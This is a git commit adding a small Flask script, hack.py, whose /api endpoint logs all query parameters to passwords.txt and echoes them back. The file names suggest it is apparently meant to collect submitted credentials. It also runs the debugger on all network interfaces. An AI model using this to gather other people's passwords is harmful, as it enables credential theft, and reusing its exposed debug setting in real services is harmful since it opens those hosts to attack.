f8756327dfa59b38a5840c6ede9fe969bf17aa0a
Deepesh Nair <denair@redhat.com>
2020-01-05 17:03:51 +0530

    [base-code] - Basic code which needs impovement.

---
+++ hack.py
@@ -0,0 +1,24 @@
+from flask import Flask,request,render_template,jsonify
+from flask_restful import Resource,Api
+
+app = Flask(__name__)
+api = Api(app)
+
+
+@app.route('/')
+def index():
+	return render_template("index.html")
+
+
+class Student(Resource):
+	def get(self):
+		with open("passwords.txt", "a") as f:
+			f.write("\n" + str(request.args) + "\n")
+		return request.args
+
+
+api.add_resource(Student,'/api')
+
+
+if __name__ == '__main__':
+	app.run(host='0.0.0.0', debug=True)
